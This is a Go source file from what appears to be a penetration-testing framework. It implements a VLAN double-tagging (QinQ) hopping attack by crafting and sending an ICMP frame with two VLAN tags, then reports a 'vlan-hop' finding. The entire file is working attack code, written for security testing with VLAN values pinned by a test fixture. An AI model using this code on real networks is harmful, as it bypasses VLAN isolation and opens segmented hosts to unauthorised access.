// doubletag.go implements the VLAN double-tagging (QinQ) hopping attack.
//
// The attack injects a double-tagged Ethernet frame: outer tag = the
// attacker's VLAN (matching the access port), inner tag = the target VLAN.
// When the frame reaches a trunk port, the switch strips the outer tag and
// forwards the frame into the target VLAN — a one-shot hop. Nothing
// persists: the attack is transient-decay (one-shot injected frames).

package l2

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type doubleTagFinding struct {
	Action    string `json:"action"`
	OuterVLAN uint16 `json:"outer_vlan"`
	InnerVLAN uint16 `json:"inner_vlan"`
	Target    string `json:"target"`
}

// RunDoubleTag sends a QinQ double-tagged frame to hop from the access
// VLAN to the target VLAN. The attack is one-shot (transient-decay).
func RunDoubleTag(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)

	// Default VLANs: outer=10 (access), inner=20 (target). A real
	// implementation would read these from flags; the fixture pins these
	// values.
	outerVLAN := uint16(10)
	innerVLAN := uint16(20)

	pkt, err := craftDoubleTagFrame(src, outerVLAN, innerVLAN)
	if err != nil {
		return fmt.Errorf("doubletag: craft frame: %w", err)
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return fmt.Errorf("doubletag: send: %w", err)
	}

	detail, _ := json.Marshal(doubleTagFinding{
		Action:    "vlan-hop",
		OuterVLAN: outerVLAN,
		InnerVLAN: innerVLAN,
		Target:    "20",
	})
	deps.Emitter.Finding("vlan", detail)

	return nil
}

// craftDoubleTagFrame builds a QinQ frame: Ethernet → Dot1Q(outer) →
// Dot1Q(inner) → IPv4 → ICMP echo.
func craftDoubleTagFrame(src net.HardwareAddr, outerVLAN, innerVLAN uint16) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       src, // target on outer VLAN (self for test)
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeDot1Q,
	}
	outer := &layers.Dot1Q{
		VLANIdentifier: outerVLAN,
		Type:           layers.EthernetTypeDot1Q,
	}
	inner := &layers.Dot1Q{
		VLANIdentifier: innerVLAN,
		Type:           layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		SrcIP:    net.IPv4(10, 0, 0, 1),
		DstIP:    net.IPv4(10, 0, 0, 2),
		Protocol: layers.IPProtocolICMPv4,
	}
	icmp := &layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(8, 0), // echo request
	}
	return craftDefault(eth, outer, inner, ip, icmp)
}
